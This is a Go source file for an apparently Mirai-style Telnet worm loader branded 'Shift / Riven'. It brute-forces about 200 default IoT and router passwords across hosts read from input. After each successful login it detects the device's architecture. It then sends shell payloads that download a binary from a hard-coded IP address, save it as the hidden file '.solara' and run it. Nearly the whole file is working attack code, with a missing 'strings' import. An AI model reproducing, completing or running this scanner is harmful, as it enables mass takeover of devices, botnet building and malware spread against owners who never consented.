package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"sync"
	"sync/atomic"
	"time"
)

var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// Original credentials
	{"root", "root"},
	{"root", ""},
	{"root", "icatch99"},
	{"admin", "admin"},
	{"user", "user"},
	{"admin", "VnT3ch@dm1n"},
	{"telnet", "telnet"},
	{"root", "86981198"},
	{"admin", "password"},
	{"admin", ""},
	{"guest", "guest"},
	{"admin", "1234"},
	{"root", "1234"},
	{"pi", "raspberry"},
	{"support", "support"},
	{"ubnt", "ubnt"},
	{"admin", "123456"},
	{"root", "toor"},
	{"admin", "admin123"},
	{"service", "service"},
	{"tech", "tech"},
	{"cisco", "cisco"},
	{"user", "password"},
	{"root", "password"},
	{"root", "admin"},
	{"admin", "admin1"},
	{"root", "123456"},
	{"root", "pass"},
	{"admin", "pass"},
	{"administrator", "password"},
	{"administrator", "admin"},
	{"root", "default"},
	{"admin", "default"},
	{"root", "vizxv"},
	{"admin", "vizxv"},
	{"root", "xc3511"},
	{"admin", "xc3511"},
	{"root", "admin1234"},
	{"admin", "admin1234"},
	{"root", "anko"},
	{"admin", "anko"},
	{"admin", "system"},
	{"root", "system"},
	
	// Additional credentials
	{"root", "12345"},
	{"root", "12345678"},
	{"root", "123456789"},
	{"root", "1234567890"},
	{"root", "123123"},
	{"root", "123qwe"},
	{"root", "1q2w3e4r"},
	{"root", "1qaz2wsx"},
	{"root", "1111"},
	{"root", "1111111"},
	{"root", "112233"},
	{"root", "121212"},
	{"root", "123321"},
	{"root", "54321"},
	{"root", "666666"},
	{"root", "888888"},
	{"root", "9999"},
	{"root", "000000"},
	{"root", "0000"},
	{"root", "0"},
	
	{"admin", "12345"},
	{"admin", "12345678"},
	{"admin", "123456789"},
	{"admin", "admin12345"},
	{"admin", "admin123456"},
	{"admin", "administrator"},
	{"admin", "Alphanetworks"},
	{"admin", "Admin"},
	{"admin", "ADMIN"},
	{"admin", "root"},
	{"admin", "123qwe"},
	{"admin", "1q2w3e4r"},
	{"admin", "1111"},
	{"admin", "0000"},
	
	{"root", "dreambox"},
	{"root", "foscam"},
	{"root", "ipcam"},
	{"root", "hikvision"},
	{"root", "dahua"},
	{"root", "activcam"},
	{"root", "trendnet"},
	{"root", "tplink"},
	{"root", "dd-wrt"},
	{"root", "openwrt"},
	{"root", "tomato"},
	{"root", "pfsense"},
	{"root", "mikrotik"},
	{"root", "juniper"},
	{"root", "hp"},
	{"root", "dell"},
	
	{"admin", "camera"},
	{"admin", "ipcam"},
	{"admin", "hikvision"},
	{"admin", "dahua"},
	{"admin", "Alphanetworks"},
	
	{"support", ""},
	{"support", "1234"},
	{"support", "support123"},
	{"support", "password"},
	
	{"guest", ""},
	{"guest", "guest123"},
	{"guest", "1234"},
	
	{"user", "1234"},
	{"user", "123456"},
	{"user", "user123"},
	{"user", "pass123"},
	
	{"ftp", "ftp"},
	{"ftp", ""},
	{"ftp", "ftp123"},
	{"ftp", "password"},
	
	{"root", "zte"},
	{"root", "Zte521"},
	{"root", "ZTE"},
	{"root", "zhongxing"},
	
	{"admin", "zte"},
	{"admin", "Zte521"},
	{"admin", "ZTE"},
	
	{"root", "wbox"},
	{"root", "wbox123"},
	
	{"admin", "wbox"},
	
	{"root", "ubnt"},
	{"root", "ubnt123"},
	
	{"admin", "ubnt"},
	
	{"root", "smcadmin"},
	{"admin", "smcadmin"},
	
	{"root", "supervisor"},
	{"admin", "supervisor"},
	
	{"root", "super"},
	{"admin", "super"},
	
	{"root", "sunny"},
	{"admin", "sunny"},
	
	{"root", "realtek"},
	{"admin", "realtek"},
	
	{"root", "pass123"},
	{"admin", "pass123"},
	
	{"root", "letmein"},
	{"admin", "letmein"},
	
	{"root", "changeme"},
	{"admin", "changeme"},
	
	{"root", "manager"},
	{"admin", "manager"},
	
	{"root", "linux"},
	{"root", "raspberry"},
	{"pi", "raspberrypi"},
	{"pi", "1234"},
	
	{"cisco", "1234"},
	{"cisco", "password"},
	{"cisco", "cisco123"},
	{"cisco", "cisco1234"},
	
	{"dlink", "dlink"},
	{"dlink", ""},
	{"dlink", "1234"},
	{"dlink", "admin"},
	
	{"linksys", "linksys"},
	{"linksys", ""},
	{"linksys", "admin"},
	
	{"netgear", "netgear"},
	{"netgear", ""},
	{"netgear", "1234"},
	{"netgear", "password"},
	
	{"tp-link", "tp-link"},
	{"tp-link", ""},
	{"tp-link", "admin"},
	
	{"asus", "asus"},
	{"asus", ""},
	{"asus", "admin"},
	{"asus", "password"},
	{"asus", "1234"},
	
	{"belkin", "belkin"},
	{"belkin", ""},
	{"belkin", "1234"},
	
	{"operator", "operator"},
	{"operator", ""},
	{"operator", "1234"},
	{"operator", "password"},
	
	{"Administrator", "Administrator"},
	{"Administrator", ""},
	{"Administrator", "admin"},
	{"Administrator", "password"},
	{"Administrator", "1234"},
	
	{"root", "7ujMko0admin"},
	{"root", "7ujMko0vizxv"},
	{"root", "7ujMko0"},
	
	{"admin", "7ujMko0admin"},
	{"admin", "7ujMko0vizxv"},
	{"admin", "7ujMko0"},
	
	{"root", "klv123"},
	{"root", "klv1234"},
	{"root", "jvbzd"},
	{"root", "juantech"},
	{"root", "luping"},
	{"root", "cat1029"},
	{"root", "defaultpassword"},
	{"root", "hi3518"},
	{"root", "ikwb"},
	
	{"admin", "klv123"},
	{"admin", "klv1234"},
	{"admin", "jvbzd"},
	{"admin", "juantech"},
}

const (
	TELNET_TIMEOUT    = 2 * time.Second
	MAX_WORKERS       = 2000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 1 * time.Second
)

// Payloads para diferentes arquitecturas
var PAYLOADS = map[string]string{
	"default": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
ARCH=$(uname -m 2>/dev/null);
if [ -z "$ARCH" ]; then ARCH=$(busybox uname -m 2>/dev/null); fi
if [ -z "$ARCH" ]; then ARCH="x86"; fi
echo "[SCANNER] Architecture detected: $ARCH";
URL="http://168.222.251.98:1283/bins/$ARCH";
if command -v wget >/dev/null 2>&1; then
    wget -q $URL -O .solara
elif command -v curl >/dev/null 2>&1; then
    curl -s $URL -o .solara
elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q $URL -O .solara 2>/dev/null || busybox curl -s $URL -o .solara 2>/dev/null
elif command -v tftp >/dev/null 2>&1; then
    tftp -g -r $ARCH -l .solara 168.222.251.98 1283 2>/dev/null
fi
chmod +x .solara 2>/dev/null
./.solara 2>/dev/null &`,
	
	"x86_64": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/x86_64 -O .solara || curl -s http://168.222.251.98:1283/bins/x86_64 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"x86": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/x86 -O .solara || curl -s http://168.222.251.98:1283/bins/x86 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"arm": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/arm -O .solara || curl -s http://168.222.251.98:1283/bins/arm -o .solara;
chmod +x .solara;
./.solara &`,
	
	"arm7": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/arm7 -O .solara || curl -s http://168.222.251.98:1283/bins/arm7 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"arm6": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/arm6 -O .solara || curl -s http://168.222.251.98:1283/bins/arm6 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"arm5": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/arm5 -O .solara || curl -s http://168.222.251.98:1283/bins/arm5 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"aarch64": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/aarch64 -O .solara || curl -s http://168.222.251.98:1283/bins/aarch64 -o .solara;
chmod +x .solara;
./.solara &`,
	
	"mips": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/mips -O .solara || curl -s http://168.222.251.98:1283/bins/mips -o .solara;
chmod +x .solara;
./.solara &`,
	
	"mipsel": `cd /tmp || cd /var/run || cd /var/tmp || cd /dev/shm || cd / || cd /root;
wget -q http://168.222.251.98:1283/bins/mipsel -O .solara || curl -s http://168.222.251.98:1283/bins/mipsel -o .solara;
chmod +x .solara;
./.solara &`,
	
	"simple": `cd /tmp; wget http://168.222.251.98:1283/bins/solara; chmod 777 solara; ./solara`,
}

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

func (s *TelnetScanner) detectArchitecture(conn net.Conn) string {
	// Limpiar buffer
	buf := make([]byte, 1024)
	conn.SetReadDeadline(time.Now().Add(100 * time.Millisecond))
	conn.Read(buf)
	
	// Comandos para detectar arquitectura
	cmds := []string{
		"uname -m 2>/dev/null; echo 'ARCH_DONE'",
		"cat /proc/cpuinfo 2>/dev/null | grep -E 'model name|Processor|system type' | head -1; echo 'ARCH_DONE'",
		"busybox uname -m 2>/dev/null; echo 'ARCH_DONE'",
	}
	
	for _, cmd := range cmds {
		conn.SetWriteDeadline(time.Now().Add(1 * time.Second))
		conn.Write([]byte(cmd + "\n"))
		time.Sleep(500 * time.Millisecond)
		
		output := s.readCommandOutput(conn)
		output = strings.ToLower(output)
		
		if strings.Contains(output, "x86_64") || strings.Contains(output, "amd64") {
			return "x86_64"
		}
		if strings.Contains(output, "i386") || strings.Contains(output, "i686") || 
		   strings.Contains(output, "i586") || strings.Contains(output, "x86") {
			return "x86"
		}
		if strings.Contains(output, "aarch64") {
			return "aarch64"
		}
		if strings.Contains(output, "armv7l") || strings.Contains(output, "armv7") {
			return "arm7"
		}
		if strings.Contains(output, "armv6l") || strings.Contains(output, "armv6") {
			return "arm6"
		}
		if strings.Contains(output, "armv5l") || strings.Contains(output, "armv5") {
			return "arm5"
		}
		if strings.Contains(output, "arm") {
			return "arm"
		}
		if strings.Contains(output, "mips") && strings.Contains(output, "el") {
			return "mipsel"
		}
		if strings.Contains(output, "mips") {
			return "mips"
		}
	}
	
	return "default"
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			// Detectar arquitectura
			arch := s.detectArchitecture(conn)
			
			// Seleccionar payload según arquitectura
			payload := PAYLOADS[arch]
			if payload == "" {
				payload = PAYLOADS["default"]
			}
			
			fmt.Printf("[*] Arquitectura detectada en %s: %s\n", host, arch)
			fmt.Printf("[*] Enviando payload a %s...\n", host)
			
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			
			// Enviar payload línea por línea
			for _, line := range strings.Split(payload, "\n") {
				if strings.TrimSpace(line) != "" {
					_, err = conn.Write([]byte(line + "\n"))
					if err != nil {
						break
					}
					time.Sleep(100 * time.Millisecond)
				}
			}
			
			output := s.readCommandOutput(conn)
			return true, CredentialResult{
				Host:     host,
				Username: username,
				Password: password,
				Output:   fmt.Sprintf("[%s] Payload enviado: %s", arch, output),
			}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT / 2

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		// Quitar puerto si viene incluido
		host = strings.Split(host, ":")[0]
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("\n[✅] Found: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
				fmt.Printf("[✅] Payload sent successfully\n\n")
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\rtotal: %d | ✅: %d | ❌: %d | queue: %d | routines: %d", 
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Printf("\n\n════════════════════════════════════\n")
	fmt.Printf("   TELNET SCANNER WITH PAYLOADS     \n")
	fmt.Printf("════════════════════════════════════\n")
	fmt.Printf("Workers: %d\n", MAX_WORKERS)
	fmt.Printf("Queue: %d\n", MAX_QUEUE_SIZE)
	fmt.Printf("Credentials: %d\n", len(CREDENTIALS))
	fmt.Printf("Payloads: %d\n", len(PAYLOADS))
	fmt.Printf("════════════════════════════════════\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := line[:len(line)-1]
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("\n📥 Input complete: %d hosts queued\n", hostCount)
		stdinDone <- true
	}()

	maxWorkers := MAX_WORKERS
	
	for i := 0; i < maxWorkers; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	fmt.Printf("\n\n════════════════════════════════════\n")
	fmt.Printf("           SCAN COMPLETE            \n")
	fmt.Printf("════════════════════════════════════\n")
	fmt.Printf("Total scanned: %d\n", scanned)
	fmt.Printf("Valid logins: %d\n", valid)
	
	if len(s.foundCredentials) > 0 {
		fmt.Printf("\nFound credentials:\n")
		for _, cred := range s.foundCredentials {
			fmt.Printf("• %s - %s:%s\n", cred.Host, cred.Username, cred.Password)
		}
	}
	fmt.Printf("════════════════════════════════════\n")
}

func main() {
	fmt.Printf("\n\n\n")
	fmt.Printf("Shift / Riven Telnet Scanner with Payloads\n")
	fmt.Printf("CPU cores: %d\n", runtime.NumCPU())
	
	scanner := NewTelnetScanner()
	scanner.Run()
}
